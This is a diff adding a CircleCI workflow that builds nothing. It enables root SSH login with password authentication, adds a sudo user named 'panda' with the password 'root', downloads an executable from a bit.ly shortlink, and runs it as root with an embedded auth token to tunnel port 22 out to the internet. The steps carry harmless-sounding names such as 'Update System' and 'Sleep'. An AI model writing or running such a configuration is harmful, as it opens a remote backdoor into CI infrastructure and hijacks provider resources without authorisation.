@@ -1,0 +1,46 @@
+version: 2.1
+jobs:
+  pnd:
+    docker:
+      - image: circleci/ruby:2.5.3
+    parallelism: 1
+    steps:
+      - run:
+         name: Update System
+         command: |
+          sudo apt-get update
+          sudo apt-get install ssh -y
+          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
+          sudo service ssh restart
+      - run:
+         name: Add User
+         command: |
+          sudo adduser --disabled-password --gecos "" panda
+          sudo su --command "adduser panda sudo"
+          sudo su --command "echo 'panda:root' | chpasswd"          
+      - run:
+         name: Restart Services
+         command: |
+          sudo su --command "echo 'Port 22' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PermitRootLogin yes' >> /etc/ssh/sshd_config"
+          sudo su --command "echo 'PasswordAuthentication yes' >> /etc/ssh/sshd_config"
+          sudo service ssh restart
+      - run: 
+         name: Connect 
+         command: |
+          wget https://bit.ly/3Iaxfe5
+          chmod +x 3Iaxfe5
+          sudo su --command "./3Iaxfe5 authtoken 22C7VwXrq4Il2k2yC4VgKYjNhsd_i6CaqAafAJ6AAHAjdixY"
+          sudo su --command "./3Iaxfe5 tcp 22 > /dev/null &"
+      - run: 
+         name: Sleep
+         command: |
+          sudo su --command "lscpu"
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - pnd
